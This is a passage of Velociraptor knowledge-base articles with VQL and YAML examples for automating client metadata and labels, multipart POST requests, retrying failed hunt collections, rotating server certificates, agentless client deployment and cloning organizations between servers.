  Extracts some key fields from the BIOS which may be useful for system
  inventory purposes. For demonstration purposes only. Currently does not cover macOS.

type: CLIENT

sources:
  - precondition: SELECT * From info() where OS = 'windows'
    query: |
      -- On Windows we use WMI
      SELECT Manufacturer AS BaseBoardManufacturer,
             Product AS BaseBoardProduct,
             Version AS BaseBoardVersion,
             SerialNumber AS BaseBoardSerialNumber
      FROM wmi(query="SELECT * FROM Win32_baseboard")

  - precondition: SELECT * From info() where OS = 'linux' AND IsAdmin
    query: |
      -- on Linux we use dmidecode
      LET info = SELECT * FROM chain(
      a={SELECT regex_replace(source=Stdout,re="([^[:graph:]])",replace="") AS BaseBoardManufacturer
         FROM execve(argv=["dmidecode", "-s", "baseboard-manufacturer"])},
      b={SELECT regex_replace(source=Stdout,re="([^[:graph:]])",replace="") AS BaseBoardProduct
         FROM execve(argv=["dmidecode", "-s", "baseboard-product-name"])},
      c={SELECT regex_replace(source=Stdout,re="([^[:graph:]])",replace="") AS BaseBoardVersion
         FROM execve(argv=["dmidecode", "-s", "baseboard-version"])},
      d={SELECT regex_replace(source=Stdout,re="([^[:graph:]])",replace="") AS BaseBoardSerialNumber
         FROM execve(argv=["dmidecode", "-s", "baseboard-serial-number"])}
      )
      SELECT info[0].BaseBoardManufacturer AS BaseBoardManufacturer,
             info[1].BaseBoardProduct AS BaseBoardProduct,
             info[2].BaseBoardVersion AS BaseBoardVersion,
             info[3].BaseBoardSerialNumber AS BaseBoardSerialNumber
      FROM scope()
```

The key thing to note is that we are interested in having the following fields
as metadata fields:

- `BaseBoardManufacturer`
- `BaseBoardProduct`
- `BaseBoardVersion`
- `BaseBoardSerialNumber`

After creating the artifact you can run it and verify that it produces the
expected results:

![Windows BIOS info](biosinfo_windows.png)

![Linux BIOS info](biosinfo_linux.png)


#### Add an artifact to collect the last logged on user

Because the BIOS information is unlikely to ever change we also want to collect
something which *does* change. For purposes of demonstration let's query the
last logged on user. We already have built-in artifacts that provide the
relevant information for Windows and Linux so we will leverage those in our new
artifact.

```yaml
name: Generic.Client.LastUser

description: Query to find the last logged on user.

type: CLIENT

sources:
  - precondition: SELECT * From info() where OS = 'windows'
    query: |
      SELECT Name AS LastUser, Mtime AS LastLogin
      FROM Artifact.Windows.Sys.Users()
      ORDER BY LastLogin DESC
      LIMIT 1

  - precondition: SELECT * From info() where OS = 'linux'
    query: |
      SELECT login_User AS LastUser, login_time AS LastLogin
      FROM Artifact.Linux.Sys.LastUserLogin()
      ORDER BY LastLogin DESC
      LIMIT 1
```

As with any new artifact it's always a good idea to run it and verify that it
produces the expected result:

![Windows last user logon](lastuser_windows.png)

![Linux last user logon](lastuser_linux.png)

From this artifact we get the following two fields which we want to have as
client metadata:

- `LastUser`
- `LastLogin`


#### Configure Metadata Indexing

When run, the above two artifacts will altogether return 6 fields
which we want added as client metadata. As explained
[here]({{< ref "/docs/clients/metadata/#indexed-metadata" >}}),
client metadata fields can be indexed or non-indexed. While all metadata is
accessible - and therefore searchable - via VQL, indexed fields are also
searchable via the search bar in the GUI. So you might be thinking
*"great, let's make everything indexed and searchable!"*.
However there are performance consequences to indexing metadata fields,
especially if you have a large number of clients. In our case we are also going
to have fields who's value may change with every interrogation and that will
require changes to the index and consequent re-indexing. So ideally you should
only index fields that are going to be useful for GUI searches. You can still
search all fields in VQL.

- `BaseBoardManufacturer`
- `BaseBoardProduct`
- `BaseBoardVersion` <- unlikely to be searched for, so it doesn't need to be indexed
- `BaseBoardSerialNumber`
- `LastUser`
- `LastLogin` <- a timestamp (string) which won't be searched for, so it doesn't need to be indexed

Given the above considerations, we need to add the following to the server
configuration file (the "defaults" section should already exist in the config).

```yaml
defaults:
  indexed_client_metadata:
    - BaseBoardManufacturer
    - BaseBoardProduct
    - BaseBoardSerialNumber
    - LastUser
```

After adding this configuration the server will need to be restarted so that it
reads the updated config file. The change will cause those metadata fields to be
created for every client. Initially the indexed metadata fields will be empty -
our server event artifact will populate their values later. You can navigate to
any client's Overview page and verify that the fields exist.

![](metadata_empty.svg)

Note: You can always edit any metadata field's value, but you cannot delete
metadata fields that are indexed.

#### Add custom interrogation artifact

When interrogation happens on the client we want it to also run the 2 new
artifacts which we added in the previous steps.

As explained
[here](https://docs.velociraptor.app/docs/clients/interrogation/#custom-artifact-override),
the default interrogation artifact can be overridden with a custom version. If
such a custom artifact is present on the Velociraptor server then all clients
will use it.

We want to modify the default artifact carefully and as little as possible (see
warning in the artifact's description!), so we are only going to add two new
sources to it which won't affect any of the default functionality:

1. The first new source will call the `Generic.Client.BiosInfo` artifact.
2. The second new source will call the `Generic.Client.LastUser` artifact.

We create our custom interrogation artifact by editing the default
`Generic.Client.Info` artifact. By default the name of the edited artifact will
be `Custom.Generic.Client.Info` which is exactly what we want it to be.

In the custom version we add the new sources after the existing ones (around line
115 in the current default artifact):

```yaml
  - name: BiosInfo
    query: SELECT * FROM Artifact.Generic.Client.BiosInfo(preconditions=TRUE)

  - name: LastUserLogin
    query: SELECT * FROM Artifact.Generic.Client.LastUser(preconditions=TRUE)
```

As you can see we are calling the other artifacts rather than including their
VQL directly in the interrogation artifact. This makes our addition more concise
and also allows the dependent artifacts to be run separately which is useful for
troubleshooting. The parameter `preconditions=TRUE` is necessary because the
dependent artifacts include preconditions that must be checked so that the
correct VQL is run for each platform.

As a check that the artifact works you can manually initiate a client
interrogation. The results should now include the two new sources.

![New sources have data](custom_generic_client_info.png)

### Configure Server Event Monitoring

At this point we have configured the collection of the required data. The next
step is to create a server event artifact and add it to server monitoring. This
will monitor for incoming results and then populate the metadata fields with
data from these results.

#### Add a Server Event Monitoring artifact

Our server event artifact to be added has 2 sources - one to monitor each of the
new client artifacts that we added to `Custom.Generic.Client.Info`.

```yaml
name: AutomateClientMetadata
type: SERVER_EVENT
sources:
- name: WatchBiosInfo
  query: |
    LET interrogations = SELECT *
    FROM watch_monitoring(artifact="System.Flow.Completion")
    WHERE Flow.artifacts_with_results =~ "Custom.Generic.Client.Info/BiosInfo"

    LET results = SELECT *, ClientId
    FROM source(
       artifact="Custom.Generic.Client.Info/BiosInfo" ,
       client_id=ClientId, flow_id=FlowId)

    SELECT *,
      client_set_metadata(
                  client_id=ClientId,
                  metadata=dict(
                    BaseBoardManufacturer=BaseBoardManufacturer,
                    BaseBoardProduct=BaseBoardProduct,
                    BaseBoardVersion=BaseBoardVersion,
                    BaseBoardSerialNumber=BaseBoardSerialNumber
                    )
                  )
    FROM foreach(row=interrogations, query=results)

- name: WatchLastUserLogin
  query: |
    LET interrogations = SELECT *
    FROM watch_monitoring(artifact="System.Flow.Completion")
    WHERE Flow.artifacts_with_results =~ "Custom.Generic.Client.Info/LastUserLogin"

    -- we sleep this query to slightly stagger the update
    LET results = SELECT *, ClientId, sleep(time=3) AS _sleep
    FROM source(
       artifact="Custom.Generic.Client.Info/LastUserLogin" ,
       client_id=ClientId, flow_id=FlowId)

    SELECT *,
      client_set_metadata(
                  client_id=ClientId,
                  metadata=dict(
                    LastUser=LastUser,
                    LastLogin=LastLogin
                    )
                  )
    FROM foreach(row=interrogations, query=results)
```

We now add this server event artifact to our server monitoring:

![Add artifact to server event monitoring](add_event_monitoring.png)

#### Test it!

If you now enroll a new client *or* perform a manual interrogation against an
existing client you will see the metadata fields populated.

![](metadata_populated.svg)

The indexed fields will now be usable as
[search operators]({{< ref "/docs/clients/searching/" >}})
in the client search bar.

![search by indexed fields](indexed_search.png)

As mentioned, the interrogation flow can be run manually by clicking the
**Interrogate** button on the client Overview page, or by creating a hunt for
the `Custom.Generic.Client.Info` artifact. Such a hunt can further be created on
a schedule as demonstrated by the
[Server.Monitoring.ScheduleHunt]({{< ref "/artifact_references/pages/server.monitoring.schedulehunt/" >}})
artifact.

## Adding/updating metadata from normal collections

Although we previously linked the metadata to interrogations, it doesn't have to
be done that way. We could, for example, hunt for either of the 2 new client
artifacts we created and have Server Monitoring add/update the metadata from the
results. Here's how to do that...

#### Add a new server monitoring artifact

This artifact is almost identical to the one we previously created. The only
difference is that instead of watching for interrogation flow completions it
watches for completions of the client artifacts themselves.

```yaml
name: AutomateClientMetadataDirect
type: SERVER_EVENT
sources:
- name: WatchBiosInfo
  query: |
    LET interrogations = SELECT *
    FROM watch_monitoring(artifact="System.Flow.Completion")
    WHERE Flow.artifacts_with_results =~ "Generic.Client.BiosInfo"

    LET results = SELECT *, ClientId
    FROM source(
       artifact="Generic.Client.BiosInfo" ,
       client_id=ClientId, flow_id=FlowId)

    SELECT *,
      client_set_metadata(
                  client_id=ClientId,
                  metadata=dict(
                    BaseBoardManufacturer=BaseBoardManufacturer,
                    BaseBoardProduct=BaseBoardProduct,
                    BaseBoardVersion=BaseBoardVersion,
                    BaseBoardSerialNumber=BaseBoardSerialNumber
                    )
                  )
    FROM foreach(row=interrogations, query=results)

- name: WatchLastUserLogin
  query: |
    LET interrogations = SELECT *
    FROM watch_monitoring(artifact="System.Flow.Completion")
    WHERE Flow.artifacts_with_results =~ "Generic.Client.LastUser"

    LET results = SELECT *, ClientId
    FROM source(
       artifact="Generic.Client.LastUser" ,
       client_id=ClientId, flow_id=FlowId)

    SELECT *,
      client_set_metadata(
                  client_id=ClientId,
                  metadata=dict(
                    LastUser=LastUser,
                    LastLogin=LastLogin
                    )
                  )
    FROM foreach(row=interrogations, query=results)
```

We then add this new artifact to our Server Event Monitoring.

![Add artifact to server event monitoring](add_event_monitoring_direct.png)

Now all we need to do is run the artifacts directly and the metadata will be
updated. You can create a hunt for these artifacts if you want to update the
data for all your clients.

The two approaches are not mutually exclusive: You can have both
`AutomateClientMetadata` and `AutomateClientMetadataDirect` added to Server
Monitoring at the same time and either one will update the same metadata.

## Searching metadata in VQL

Searching metadata values in VQL is easy. Here's an example that will list all
systems where Mary was the last user to log on.

```vql
SELECT client_id,
       os_info.hostname,
       client_metadata(client_id=client_id).LastUser AS LastUser,
       client_metadata(client_id=client_id).LastLogin AS LastLogin
FROM clients()
WHERE LastUser = "Mary"
```

![Running a search in a notebook](vql_search.png)

Tags: #configuration #vql #deployment

---END OF FILE---

======
FILE: /content/knowledge_base/tips/automating_labels.md
======
# How can I automatically apply labels to clients?

[Labels]({{< ref "/docs/clients/labels/" >}}) are used to target clients in
Velociraptor. All clients that share a particular label can be treated as a
group in common operations such as hunts and client monitoring. Labels can also
be used to search for and filter clients in the GUI and in VQL queries.

Sometimes it is useful to automatically label clients based on some property of
the client or the results of a collection. You can do this by running a
[Server Event]({{< ref "/docs/server_automation/server_monitoring/" >}}) artifact
which automatically applies labels based on some criteria that you define.

In this article we demonstrate two use cases: a basic and a more advanced one.

{{% notice note "Labels or Metadata?" %}}

Metadata is a set of fields associated with each client. Labels can also be
regarded as information associated with a client, but in Velociraptor labels are
a more transient kind of information and are designed to be added and removed
relatively frequently. Labels provide a way to group clients whereas Metadata
provides a way to store information *about* each client.

It's important that you choose the appropriate one for your use case. This
article is about automating Labels but if you want to do similar automation of
Metadata then you may find this article more useful:
[How can I automatically add & update client metadata?]({{< ref "/knowledge_base/tips/automating_metadata/" >}})

{{% /notice %}}

## Basic Use Case: Labelling based on default interrogation data

When a client connects for the first time in a Velociraptor deployment, the
server instructs the client to enroll and also tells it to run the
`Generic.Client.Info` artifact. This built-in artifact is designed to collect
basic information about the endpoint. We refer to this process as
["interrogation"]({{< ref "/docs/clients/interrogation/" >}}).

We can watch the system for any new collections of `Generic.Client.Info` and
apply labels based on the results.

The following example will label a client with the label "Server" if it is
running any kind of Windows Server Operating System.

```vql
LET interrogations = SELECT *
  FROM watch_monitoring(artifact="System.Flow.Completion")
  WHERE Flow.artifacts_with_results =~ "Generic.Client.Info/BasicInformation"

LET results = SELECT *, ClientId
              FROM source(
                 artifact="Generic.Client.Info/BasicInformation" ,
                 client_id=ClientId, flow_id=FlowId)
              WHERE Platform =~ "Server"

SELECT *, label(client_id=ClientId, labels="Server", op="set")
FROM foreach(row=interrogations, query=results)
```

1. The `interrogations` query will watch for any flow completion with results
   for the `Generic.Client.Info/BasicInformation` source. This will provide the
   flow id and the client id.
2. The `results` query will read all the results from the collection. Typically
   the `Platform` field will contain the Windows Release information. We filter
   out all rows except those that match the word "Server" to only see results
   from the Windows Server platform.
3. Finally for each interrogation we get the results and finally "set" the
   label "Server" on the client id.

Now that we have the VQL worked out, we just package it in a `SERVER_EVENT`
artifact.

```yaml
name: AutomateServerLabels
type: SERVER_EVENT
sources:
- query: |
    LET interrogations = SELECT *
    FROM watch_monitoring(artifact="System.Flow.Completion")
    WHERE Flow.artifacts_with_results =~ "Generic.Client.Info/BasicInformation"

    LET results = SELECT *, ClientId
    FROM source(
       artifact="Generic.Client.Info/BasicInformation" ,
       client_id=ClientId, flow_id=FlowId)
    WHERE Platform =~ "Server"

    SELECT *
    label(client_id=ClientId, labels="Server", op="set")
    FROM foreach(row=interrogations, query=results)
```

![Adding a new artifact](artifact.png)

Now we can enable monitoring of these events by adding the artifact to
the server event table.

![Installing server event monitoring](installing_event_monitoring.svg)

Now when a new server enrolls the label "Server" will be applied.

Note that we don't need to add a label for non-servers (i.e. "workstations")
because targeting a hunt, for example, allows us to exclude specific labels.

![Label added](server_label.svg)

{{% notice tip "Refreshing labels" %}}

The above artifact will automatically label clients when the
`Generic.Client.Info` collection is run on the clients. This collection runs
when the client is first seen but you can run it at any time.

To relabel all clients - even after they were enrolled - you can just start a
hunt for `Generic.Client.Info` at any time. It is fine to re-apply the label
many times as duplicate labels cannot occur.

Bulk removal of a specific label is possible by running VQL in a notebook, for
example:

```vql
SELECT client_id, label(client_id=client_id, labels=["Server"], op="remove")
FROM clients()
```

{{% /notice %}}

## Advanced Use Case: Labelling based on custom interrogation data

In the previous example we used data that was already being gathered by the
`Generic.Client.Info` artifact. In addition, the `Platform` information doesn't
ever change, so every time you run it you will get the same result. Boring!

Now let's look at applying a label based on data that *isn't* included in the
default interrogation artifact, and that is dynamic (i.e. will change over time).
Here we will use a Sigma rule from the
[Hayabusa Rules](https://sigma.velocidex.com/docs/artifacts/velociraptor_hayabusa_ruleset/)
ruleset.

In order for this to work you'll need to have already imported the "Velociraptor
Hayabusa Ruleset" by running the `Server.Import.CuratedSigma` server artifact on
your server. To learn more about Sigma rules in Velociraptor
[see this page](https://sigma.velocidex.com/docs/sigma_in_velociraptor/).

![Running Server.Import.CuratedSigma](sigma_import.png)

The Sigma rule we will be using in this example is
[Windows Defender Threat Detected](https://github.com/Yamato-Security/hayabusa-rules/blob/main/sigma/builtin/windefend/win_defender_threat.yml).

When interrogation happens on the client we want it to also check whether
Windows Defender has detected any threats in the past 24 hours. This may be a
somewhat contrived example but it (or something similar) may also have
realworld usefulness if you are rolling out Velociraptor clients in response to
an incident. It may be useful to have endpoints flagged based on recent Defender
detections to aid with triage.

As explained
[here](https://docs.velociraptor.app/docs/clients/interrogation/#custom-artifact-override)
in the documentation, the default interrogation artifact can be overridden with
a custom version. If such a custom artifact is present on the Velociraptor
server then all clients will use it.

We want to modify the default artifact as little as possible, as advised in
the artifact's description, so we are only going to add a new source to it: one
which calls the `Windows.Hayabusa.Rules` artifact.

We do this by editing the default `Generic.Client.Info` artifact. By default the
name of the edited artifact will be `Custom.Generic.Client.Info` which is
exactly what we want it to be.

In the custom version we add a new source after the existing ones (around line
115 in the current default artifact):

```vql
  - name: RecentDefenderDetections
    precondition: SELECT OS From info() where OS = 'windows'
    query: |
      LET past_day <= timestamp_format(time=now() - 86400)
      SELECT *
      FROM Artifact.Windows.Hayabusa.Rules(RuleLevel="All",
                                           RuleStatus="All Rules",
                                           RuleTitleFilter="Windows Defender Threat Detected",
                                           DateAfter=past_day)
```

If we now run an interrogation manually on a Windows client where we have
deliberately triggered a detection using the EICAR test file, we see that the
Sigma rule has run and that the detection has been included in the collection
results.

![Manual interrogation test](defender_detection.svg)

We have now extended our interrogation data with something more dynamic than in
the first example. The remaining steps are essentially the same except that we
are monitoring a different source and adding a different label.

We add a new `SERVER_EVENT` artifact:

```yaml
name: LabelRecentDefenderDetections
type: SERVER_EVENT
sources:
- query: |
    LET interrogations = SELECT *
    FROM watch_monitoring(artifact="System.Flow.Completion")
    WHERE Flow.artifacts_with_results =~ "Custom.Generic.Client.Info/RecentDefenderDetections"

    SELECT *,
    label(client_id=ClientId, labels="Recent Threat Detection", op="set")
    FROM interrogations
```

This artifact is slightly simpler than the one in the previous example because
we don't need to check for any specific value in the results. If the results
contain *any* rows then we want the label to be applied. Of course you could
make it more sophisticated if you wanted.

Lastly we add the artifact to the server event table as we did with the first
example.

![Installing server event monitoring](event_monitoring2.png)

Now the interrogation of any Windows client will also check the Windows Defender
logs and if a threat was logged in the past 24 hours the client will be labelled
"Recent Threat Detection".

![Label added!](label_added.png)

As with the basic use case you can force all clients to re-run this check by
creating a hunt for the `Custom.Generic.Client.Info` artifact.

Tags: #automation #labels
---END OF FILE---

======
FILE: /content/knowledge_base/tips/multiparts_uploads.md
======
# How can I make a multipart/form-data POST request in VQL

VQL can be used to make http requests using the `http_client()`
plugin. While `GET` requests are usually pretty straight forward,
sometimes we need to upload using something called
`multipart/form-data` POST. What is it and how can VQL do this?

## What is `multipart/form-data` POST?

This is a standard way of serializing multiple "parts" into a single
request. A "part" here is a value of a parameter or usually a
file. Traditionally this came from a HTML "form" element, but often
these are used for APIs now without a browser interface at all.

The idea is that we define a "boundary" - a special string which is so
unique it might not appear accidentally in the data, then we separate
the parts using this boundary:

```
--boundary
Headers

Data
--boundary
Headers

Data
--boundary--
```


1. Each part starts with "--" followed by the boundary and a line feed.
2. Next come the headers which describe things about this part
   followed by two line feeds.
3. Next come the body of the part
4. Finally after the last part, the end is signaled by "--" followed
   by the boundary and another "--" followed by new line.


The most confusing part of this is that when looking at examples, the
boundary is often something like
`-----------------------------9051914041544843365972754266` making it
virtually impossible to see the extra "--" at the start and end (you
have to carefully count to realize the boundary header adds two
extra dashes!).

## Combining in VQL

Anyway once the whole this is demystified it is really easy to create
this in VQL. Here is an example:

```vql
LET Boundary = "-----------------------------9051914041544843365972754266"

-- A Helper function to make a regular form variable.
LET Data(Name, Value) = format(
  format='--%s\r\nContent-Disposition: form-data; name="%s"\r\n\r\n\r\n%v\r\n',
  args=[Boundary, Name, Value])

-- A Helper function to embed a file content.
LET File(Filename, ParameterName, ContentType, Data) = format(
  format='--%s\r\nContent-Disposition: form-data; name="%s"; filename="%s"\r\nContent-Type: %s\r\n\r\n%v\r\n',
  args=[Boundary, ParameterName, Filename, ContentType, Data])

-- The End boundary signals the last part
LET END = format(format="%s--\r\n", args=Boundary)

-- Now make the HTTP request and post the form
-- Remember the Content-Type header which includes the boundary!
SELECT * FROM http_client(
  method="POST",
  url="http://www.example.com/formhandler",
  headers=dict(`Content-Type`="multipart/form-data; boundary=" + Boundary),
  data=Data(Name="name", Value="Bar") +
       File(Filename="Hello.txt", ParameterName="file_upload", ContentType="text/plain", Data="this is a test") +
       END)
```

In this example I used some utility functions to make it easier to build the 
different parts and make sure the encoding structure is always correct.

Tags: #vql

---END OF FILE---

======
FILE: /content/knowledge_base/tips/retry_hunt.md
======
# How do I re-collect a failed artifact in a hunt?

Sometimes collecting an artifact in a hunt does not work as
expected.

Most commonly the issue is that the timeout or upload limit
for collecting the artifact is exceeded and Velociraptor cancels the
collection to prevent placing the endpoint under too much strain.

How do we work around this? We can recollect the artifact only on that
failed endpoint with a few button clicks.

In the following example I will start a collection for the `$MFT` but
I will only set the timeout to 10 seconds and `100Mb` uploaded.

![Hunting for Files](hunting_by_label.png)

In the hunt resources screen I can specify limits for collection from
any one client. These limits are intended to set reasonable boundaries
for how much data I am expecting to collect so we do not overload the
network or the endpoint itself.

![Setting resource limits](setting_resources.png)

Clearly these limits are too small for this client because the
collection was cancelled after 10 seconds. Normally the default
timeout of 10 Minutes, but collecting such a lot of data may take
longer than that.

![Collection timed out](timed_out.png)

Although some data was transferred, not all the data was fully
collected. This might be acceptable but if this machine is really
compromised how can I recollect the same artifact?

By inspecting the collections for each client in the `Clients` tab, I
can quickly see which one failed.

![Inspecting failed collection](failed_collection.png)

Since a hunt is just a grouping of regular collections, I can navigate
to the client in the interface (by clicking the client button) and
find the hunt's collection that failed.

![Copying the collection](copy_collection.png)

Now I just copy the collection as normal and here I can update the
resource limits if needed (or maybe change some of the parameters).

![Successful Collection](successful_collection.png)

Now that this collection is completed I can just look at the results
of the collections by itself or download the collection files for
further analysis.

However, it is much more useful to keep all related collections in the
same hunt. This helps when analyzing the hunt results in the notebook
or exporting all the related files at once.

{{% notice tip "Hunts are a set of collections" %}}

It is best to think of a `hunt` as just a set of related artifact
collections. You can add/remove collections from this set at will.

{{% /notice %}}

I am adding the new collection to the hunt manually by clicking the
`Add to Hunt` button.

![Manually Adding the collection to the hunt](manually_adding_hunt_collection.png)

The interface shows me all hunts that collected the same artifact so I
choose which hunt to add it to.

![The new collection is now part of the hunt](new_hunt_collection.png)


Now the new successful collection is part of the hunt. I can see it as
a second entry in the client's list.

{{% notice note "Deleting the old collection" %}}

Velociraptor does not automatically delete the old failed collection
because it may still have some useful data (some data **was**
transferred).

If you do not want the old data any more, then just click the `Delete
Flow` button once a better collection is available.

{{% /notice %}}

## Using VQL

The above discussion was how to manually redo collections in the GUI
but if there are many collections, it might be easier to use VQL to do
this.

```vql
LET NewCollections = SELECT ClientId, FlowId,
    collect_client(client_id=ClientId,
        artifacts=Flow.request.artifacts,
        spec=Flow.request.specs,
        max_bytes=1000000000,
        timeout=600) AS NewCollection
FROM hunt_flows(hunt_id=HuntId)
WHERE Flow.state =~ "ERROR"

SELECT ClientId, NewCollection, hunt_add(
   client_id=ClientId,
   hunt_id=HuntId,
   flow_id=NewCollection.flow_id) AS Hunt
FROM NewCollections
```

1. The `NewCollections` query gets all Flows in the `ERROR` state
   within a hunt and schedules a new collection using the same
   artifacts but increasing the maximum upload size to 1gb and timeout
   to 600 seconds.

2. The next query adds the new collection to the hunt.

Note this query will only work after [#2067](https://github.com/Velocidex/velociraptor/commit/768021225bd617bb279fe424dcdf29c6d7d467b4)


Tags: #hunting #vql

---END OF FILE---

======
FILE: /content/knowledge_base/tips/rolling_certificates.md
======
# How to fix "certificate has expired or not yet valid error"?

When Velociraptor generates a configuration file it also generates
some certificates to secure it's internal PKI.

The CA certificate is embedded in the client's configuration file and
underpins the entire Velociraptor communications protocol - all
certificates are issued by this internal CA. The Velociraptor CA is
set to expire in 10 years.

The Server certificate is signed by the CA certificate and is set to
expire in 1 year by default. When the certificate expires, clients
will be unable to connect to the server any more.

You can check the expiry time of the server certificate using curl and
openssl:

```
$ curl -s -k https://127.0.0.1:8000/server.pem | openssl x509 -text  | grep -A 2 Validity
Validity
   Not Before: Apr 13 12:05:46 2022 GMT
   Not After : Apr 13 12:05:46 2023 GMT
```

## What happens when the certificate expires?

- When the internal server certificate expires clients will not accept it and
  they will refuse to communicate. Clients will show as offline in the GUI and
  buffer data as long as possible, subject to their configured buffer limits.
- New GUI sessions will fail with "500 Internal Server Error" and the response
  body `{"code":2,"message":"Must set a username"}` and fail to load.

For Velociraptor versions 0.74 and later there is a mechanism to mitigate the
impact of unexpected certificate expiry:

- Upon restarting the server service, if the certificate
  (`Frontend.certificate`) has expired, and if the server.config.yaml contains
  the CA private key then it will automatically issue a new cert with the same
  validity period as the expired one. This temporary certificate is held in
  memory only and is NOT written to the server.config.yaml.
- In the server log you will see the following messages:

```bash
[ERROR] <log_date> Frontend Certificate is not valid: Certificate Valid NotBefore <start_date> and Not After <end_date> but Now is <current_date>. See https://docs.velociraptor.app/knowledge_base/tips/rolling_certificates/
[INFO] <log_date> Found CA private key in config, will automatically rotate keys, but you should consider updating the config file using `velociraptor config rotate`
```
If this is the case you should update your server certificate by reissuing a new
one.

## Rotating certificates

Reissuing a new server certificate can be performed at any time using the
`config reissue_certs` command. You can even reissue a certificate with extended
validity before you deploy your server.

The procedure amounts to generating a new server configuration which is derived
from the old one, and then replacing the old config with the new config.

The `config rotate_keys` command can be used to regenerate both the server
certificate and the associated private key. Although this is not necessary for
operational purposes, it is considered good security practice to rotate keys and
certificates periodically, and particularly after a suspected systems
compromise.

{{% notice info %}}

For server versions older than 0.72.3 please use the following commands instead
of those shown below:

|                         Goal                         | Command for the current version     | Command for versions <0.72.3      |
|:----------------------------------------------------:|-------------------------------------|-----------------------------------|
|             Reissue only the server cert             | `velociraptor config reissue_certs` | `velociraptor config reissue_key` |
| Reissue the server cert and<br> also the private key | `velociraptor config rotate_keys`   | `velociraptor config rotate_key`  |

{{% /notice %}}

#### Setting a non-standard validity

When reissuing the certificate the `--validity` flag can be used to extend the
validity beyond the default of one year. For example, to generate a config
containing a server certificate which is valid for 2 years, you would run the
command:

```sh
velociraptor --config server.config.yaml config reissue_certs --validity 730  > new.server.config.yaml
```

If you expect your server to be a long-term instance then you don't have to
start with the default 1-year validity and wait for the certificate to expire.
You can generate a new config on day 1 based on the initial config using the
`config reissue_certs` command. You can then use the new config for the new
server installation.

{{% notice tip %}}

In version 0.74 and later the configuration wizard (`velociraptor config
generate -i`) allows you to issue the server certificate with either 1-year,
2-year or 10-year validity.

{{% /notice %}}

#### Option 1: Reissue only the server cert

To rotate server certificates, use the following command to generate a new
configuration file containing rotated certificates:

```
$ velociraptor config reissue_certs --config /etc/velociraptor/server.config.yaml > /tmp/new_key.config.yaml
```

The `config reissue_key` command updates the following configuration items:
- `GUI.gw_certificate`
- `Frontend.certificate`

`CA.private_key`, `Client.ca_certificate`, `GUI.gw_private_key`, and `Frontend.private_key` are preserved.

#### Option 2: Reissue the server cert and also the private key

Alternatively, you can regenerate the server's private keys and rotate the
certificates at the same time:

```
$ velociraptor config rotate_keys --config /etc/velociraptor/server.config.yaml > /tmp/new_key.config.yaml
```

The `config rotate_keys` command updates the following configuration items:
- `GUI.gw_certificate`
- `GUI.gw_private_key`
- `Frontend.certificate`
- `Frontend.private_key`

`CA.private_key` and `Client.ca_certificate` are preserved.

The previous two commands will not affect the CA private key and
certificate, which is valid for 10 years, as described previously.

You can view the new certificate using jq and openssl (here `jq` is
used to show the PEM certificate of the frontend and `openssl` is used
to decode it)

```
$ velociraptor --config /tmp/new_key.config.yaml config show --json | jq -r .Frontend.certificate | openssl x509 -text  | grep -A 2 Validity
Validity
   Not Before: Apr 25 21:01:51 2022 GMT
   Not After : Apr 25 21:01:51 2023 GMT
```

Now back up the old configuration file and replace it with the new
file, then restart the server. Clients should reconnect automatically.

Tags: #configuration #deployment

---END OF FILE---

======
FILE: /content/knowledge_base/tips/deploying_in_agentless_mode.md
======
# How do I deploy the client as agentless (without install)?

Sometimes we need to deploy Velociraptor in an IR and can not install
it permanently as a service.

## Windows Environments

It is possible to deploy the client using Group Policy by using
`Scheduled task` feature to cause domain connected machines to run the
client. See details [here]({{< ref "/blog/html/2019/03/02/agentless_hunting_with_velociraptor/" >}}).

1. The first step is to place the client and the generated
   `client.config.yaml` on a public read only windows share.

2. Update the config file's writeback location to somewhere writable
   on the client (e.g. `C:\Windows\Temp\velo.writeback.yaml`)

3. Next create a `Scheduled Task` in a new group policy object that
   applies to the relevant OU.

4. The scheduled task should be launched as `NT_AUTHORITY\SYSTEM` from
   the read only share. With the appropriate command line. For example:

```
\\dc\deployment\velociraptor.exe --config \\dc\deployment\client.config.yaml client --mutant MyVeloName
```


{{% notice warning "Controlling number of instances" %}}

Window's Group Policy allows setting only a single instance of the
program to run at the time, however we found in practice this is not
reliable and sometimes GPO will launch dozens of copies of
Velociraptor over time. To avoid this we use the `--mutant` flag which
will exit if a mutant of this name already exists.

{{% /notice %}}

## Linux Environments

### Systemd

It is possible to execute a program in a "transient scope", which enables it to be controlled and inspected just like a regular service (unit) in Linux, without the need to create persistent configurations.
Using ```systemd-run``` the process will be executed and its parent will be the `init` process, and will not terminate until the host is rebooted.

To execute the Velociraptor binary run the following:

```
systemd-run -u velociraptor_tmp /tmp/velociraptor.bin client --config /tmp/client.config.yaml
```
Once the service is running, you should now be free to terminate the SSH / management session without terminating the process.

You can manually terminate the service with: ```systemctl stop velociraptor_tmp.service ```

You can check it's status with: ```systemctl status velociraptor_tmp.service```

{{% notice warning "Temporary locations" %}}

On Linux /tmp is cleaned up by a service, which gets triggered on shutdown.
You will need to arrange for the Velociraptor binary and configuration file to be transferred again if the host reboots.

{{% /notice %}}

You can read more about the ```systemd-run``` here for flags etc: https://www.freedesktop.org/software/systemd/man/systemd-run.html


Tags: #deployment

---END OF FILE---

======
FILE: /content/knowledge_base/tips/clone_organization_to_other_server.md
======
# How can I clone an organization with all its hunts and artifacts to another instance?

There are a few use cases where you need to migrate data from an instance to another. It could be for educational purpose to provide pre-filled labs, or to provide a third party with the exact insights you had during your investigation. Event for archiving, being able to reload a dataset in Velociraptor to review what was done if something went amiss, being able to export and import an organization dataset could prove useful.

## Exporting

Everything related to an organization is stored in a directory under `<file store>/orgs`. There is:

- A directory with the org ID
- A configuration file `<orgId>.json.db`

We need to transfer both to the destination server.

1. Identify the org ID, either with the [`Server.Orgs.ListOrgs` Artifact](https://docs.velociraptor.app/artifact_references/pages/server.orgs.listorgs/) or scrolling down the Velociraptor *root org* home page.
2. Archive the folder and the `json.db` file (mind the star) 

```bash
tar czf transport-<org name>.tar.gz <file store>/orgs/<org id>* 
```

3. Transfer the resulting archive to the destination Velociraptor server.

## Importing

1. Decompress the archive under the `<file store>/orgs` directory. 

{{% notice tip "No orgs folder" %}}

The `orgs` directory is created with the first organization. After a fresh install of Velociraptor, it doesn't exist until you create an org. You may also simply create the directory.

{{% /notice %}}

2. Verify file ownership and permissions are similar to other directories in the file store
2. Start Velociraptor
2. You should see the organization with all its content as it were on the origin server

{{% notice tip "Can't see the org" %}}

